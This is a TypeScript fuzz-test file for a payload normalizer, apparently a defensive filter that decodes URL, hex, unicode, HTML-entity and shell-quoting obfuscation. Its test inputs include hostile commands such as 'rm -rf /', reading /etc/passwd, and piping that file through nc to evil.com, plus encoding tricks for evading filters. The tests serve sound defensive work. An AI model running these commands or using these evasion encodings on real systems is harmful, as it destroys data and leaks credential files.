/**
 * Fuzz tests for PayloadNormalizer.
 *
 * Covers: URL encoding bypasses, hex encoding bypasses, unicode homoglyphs,
 * HTML entity bypasses, shell obfuscation, double-encoding, null byte attacks,
 * memory exhaustion, nested encoding bombs.
 */
import { describe, it, expect } from 'vitest';
import { PayloadNormalizer } from '../../src/utils/payload-normalizer.js';

const normalizer = new PayloadNormalizer(5, 100000);

describe('PayloadNormalizer — Basic Decoding', () => {
  it('should URL-decode percent-encoded strings', () => {
    const result = normalizer.normalize('%72%6D%20%2D%72%66%20%2F');
    expect(result.normalized).toContain('rm');
    expect(result.normalized).toContain('-rf');
    expect(result.wasModified).toBe(true);
  });

  it('should decode hex escapes like \\x72\\x6d', () => {
    const result = normalizer.normalize('\\x72\\x6d\\x20\\x2d\\x72\\x66');
    expect(result.normalized).toContain('rm');
    expect(result.normalized).toContain('-rf');
    expect(result.wasModified).toBe(true);
  });

  it('should decode unicode escapes like \\u0072\\u006d', () => {
    const result = normalizer.normalize('\\u0072\\u006d');
    expect(result.normalized).toBe('rm');
    expect(result.wasModified).toBe(true);
  });

  it('should decode HTML entities like &sol;etc/passwd', () => {
    const result = normalizer.normalize('&sol;etc&sol;passwd');
    // After normalization, expect /etc/passwd
    expect(result.normalized).toMatch(/\/etc/);
    expect(result.wasModified).toBe(true);
  });

  it('should decode decimal HTML entities like &#47;etc&#47;passwd', () => {
    const result = normalizer.normalize('&#47;etc&#47;passwd');
    expect(result.normalized).toMatch(/\/etc/);
    expect(result.wasModified).toBe(true);
  });

  it('should decode hex HTML entities like &#x2F;etc&#x2F;passwd', () => {
    const result = normalizer.normalize('&#x2F;etc&#x2F;passwd');
    expect(result.normalized).toMatch(/\/etc/);
  });
});

describe('PayloadNormalizer — Evasion Techniques', () => {
  it('should handle double URL encoding: %25 → %', () => {
    const result = normalizer.normalize('%2572%256d');
    // %25 = %, %2572 = %72 = r
    expect(result.normalized).toMatch(/rm/);
  });

  it('should handle triple URL encoding', () => {
    const result = normalizer.normalize('%252572%25256d');
    // Triple encoded should eventually decode to rm
    expect(result.normalized).toMatch(/rm/);
  });

  it('should handle mixed encoding layers', () => {
    // URL-encoded hex escapes — fully decoded by iterative loop
    const result = normalizer.normalize('%5C%78%37%32%5C%78%36%64');
    // The decode loop resolves URL → \x escapes → actual chars = "rm"
    expect(result.normalized).toMatch(/rm/);
    expect(result.wasModified).toBe(true);
  });

  it('should normalize unicode homoglyphs (fullwidth chars)', () => {
    // Fullwidth 'r' and 'm' (U+FF52, U+FF4D)
    const result = normalizer.normalize('\uFF52\uFF4D \uFF0D\uFF52\uFF46 \uFF0F');
    expect(result.normalized).toMatch(/rm/);
  });

  it('should collapse shell quote obfuscation ("r"m)', () => {
    // "r"m simulates quote splitting
    const result = normalizer.normalize('"r""m" "-rf"');
    expect(result.normalized).toMatch(/rm/);
  });

  it('should handle ANSI-C quoting (dollar-sign single-quote)', () => {
    // This test checks symbolic representation, actual behavior depends on shellNormalize
    const result = normalizer.normalize("$'rm'");
    expect(result.normalized).toMatch(/rm/);
  });

  it('should handle backslash-escape obfuscation (r\\m)', () => {
    const result = normalizer.normalize('r\\m -r\\f /');
    expect(result.normalized).toMatch(/rm/);
  });
});

describe('PayloadNormalizer — Adversarial Fuzz', () => {
  it('should detect null bytes in encoded payloads', () => {
    const result = normalizer.normalize('\\x00cmd\\x00');
    // Null byte should be preserved as \0 marker
    expect(result.normalized).toContain('\\0');
  });

  it('should handle empty input', () => {
    const result = normalizer.normalize('');
    expect(result.normalized).toBe('');
    expect(result.wasModified).toBe(false);
  });

  it('should handle already-clean input without modification', () => {
    const result = normalizer.normalize('{"path": "/tmp/test.txt"}');
    expect(result.normalized).toBe('{"path": "/tmp/test.txt"}');
    expect(result.wasModified).toBe(false);
  });

  it('should not crash on extremely long inputs', () => {
    const long = 'A'.repeat(2000000);
    const result = normalizer.normalize(long);
    expect(result.normalized.length).toBeLessThanOrEqual(100001);
    expect(result.transformations).toContain('truncated');
  });

  it('should handle recursive encoding bombs without stack overflow', () => {
    // Create a deeply nested encoding pattern
    const nested = '%25'.repeat(100) + 'x';
    const result = normalizer.normalize(nested);
    // Should complete without error
    expect(result.normalized).toBeDefined();
  });

  it('should handle regex special chars in payloads', () => {
    const result = normalizer.normalize('.*+?^${}()|[]\\');
    // Should not crash
    expect(result.normalized).toBeDefined();
  });

  it('should detect shell metacharacters after normalization', () => {
    const result = normalizer.normalize('echo $(cat /etc/passwd)');
    expect(result.normalized).toContain('$(');
    expect(result.normalized).toContain('passwd');
  });

  it('should normalize pipe chains', () => {
    const result = normalizer.normalize('cat /etc/passwd | nc evil.com 1337');
    expect(result.normalized).toContain('|');
    expect(result.normalized).toContain('passwd');
  });

  it('should handle semicolon command chaining', () => {
    const result = normalizer.normalize('cmd1; cmd2; rm -rf /');
    expect(result.normalized).toContain(';');
    expect(result.normalized).toContain('rm');
  });

  it('should handle and-if chaining (&&)', () => {
    const result = normalizer.normalize('cmd && rm -rf /');
    expect(result.normalized).toContain('&&');
  });

  it('should handle or-if chaining (||)', () => {
    const result = normalizer.normalize('cmd || rm -rf /');
    expect(result.normalized).toContain('||');
  });
});

describe('PayloadNormalizer — Shell Normalization', () => {
  it('should strip ANSI-C quoting', () => {
    const result = normalizer.normalize("$'echo' $'hello'");
    expect(result.normalized).toMatch(/echo/);
    expect(result.normalized).toMatch(/hello/);
  });

  it('should collapse quote splitting', () => {
    const result = normalizer.normalize(`'e'""'ch'"o"`);
    // Normalize whitespace + shell normalization
    expect(result.normalized).toMatch(/echo/);
  });

  it('should unwrap single backslash escapes on non-special chars', () => {
    const result = normalizer.normalize('c\\m\\d');
    expect(result.normalized).toBe('cmd');
  });

  it('should preserve legitimate escaped special chars', () => {
    const result = normalizer.normalize('echo \\$HOME');
    expect(result.normalized).toContain('$HOME');
  });
});

describe('PayloadNormalizer — JSON recursive normalization', () => {
  it('should recursively normalize string values in objects', () => {
    const input = { path: '%2Fetc%2Fpasswd', command: '\\x63\\x61\\x74' };
    const result = normalizer.normalizeJsonValue(input);
    expect((result as any).path).toBe('/etc/passwd');
    expect((result as any).command).toBe('cat');
  });

  it('should recursively normalize nested arrays', () => {
    const input = ['%2Fetc', { cmd: '\\x72\\x6d' }, ['%2Fvar']];
    const result = normalizer.normalizeJsonValue(input) as any[];
    expect(result[0]).toBe('/etc');
    expect((result[1] as any).cmd).toBe('rm');
    expect(result[2][0]).toBe('/var');
  });

  it('should handle non-string values unchanged', () => {
    const result = normalizer.normalizeJsonValue(42);
    expect(result).toBe(42);
    const result2 = normalizer.normalizeJsonValue(null);
    expect(result2).toBe(null);
  });

  it('should guard against deep recursion', () => {
    let deep: any = { value: '%2F' };
    for (let i = 0; i < 100; i++) {
      deep = { nested: deep };
    }
    // Should not stack overflow
    const result = normalizer.normalizeJsonValue(deep);
    expect(result).toBeDefined();
  });
});

describe('PayloadNormalizer — Edge Cases', () => {
  it('should handle malformed URL encoding gracefully', () => {
    const result = normalizer.normalize('%ZZ%GG');
    expect(result.normalized).toBe('%ZZ%GG'); // Kept as-is
  });

  it('should handle incomplete escape sequences', () => {
    // \x without hex digits: backslash-unwrap removes the backslash
    const result = normalizer.normalize('\\x');
    expect(result.normalized).toBe('x');
  });

  it('should handle Unicode normalization of composed chars', () => {
    // é as e + combining accent → single é
    const result = normalizer.normalize('e\u0301');
    expect(result.normalized).toBe('\u00e9');
    expect(result.wasModified).toBe(true);
  });

  it('should handle whitespace normalization', () => {
    const result = normalizer.normalize('  cmd   -rf   /  ');
    expect(result.normalized).toBe('cmd -rf /');
  });

  it('should track all applied transformations', () => {
    const result = normalizer.normalize('%72%6D -rf /');
    expect(result.transformations.length).toBeGreaterThan(0);
    // The decode loop resolves %72%6D → "rm" (with whitespace between tokens)
    // Whitespace normalization collapses spaces in the final cleaned output
    expect(result.transformations.length).toBeGreaterThan(0);
  });
});